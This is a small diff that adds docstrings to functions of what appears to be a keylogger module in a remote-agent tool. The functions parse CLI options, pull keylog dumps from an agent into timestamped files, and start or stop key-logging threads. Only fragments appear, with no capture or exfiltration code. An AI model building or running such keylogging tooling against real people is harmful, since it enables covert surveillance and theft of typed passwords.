@@ -6,6 +6,8 @@ from gzip import decompress as degzip
 from common import bcolors as bc
 
 def parse_args(agent, args=None):
+    """Parse arguments from CLI"""
+
     #Initial argument setup
     start = False
     dump = False
@@ -40,6 +42,8 @@ def parse_args(agent, args=None):
     return settings
 
 def get_keylog_dump(agent, show = False):
+    """REceive large amounts of keylog data by looping recieve function"""
+
     try:
         #Setup out-file
         timestamp = time.strftime("-%Y-%m-%d-%H%M%S")
@@ -84,6 +88,8 @@ def get_keylog_dump(agent, show = False):
 
 
 def main(agent, args=None):
+    """Main function to start, stop and interact with key logging threads"""
+
     try:
         #get settings
         #bc.info("gitting the settings now: {}".format(args))
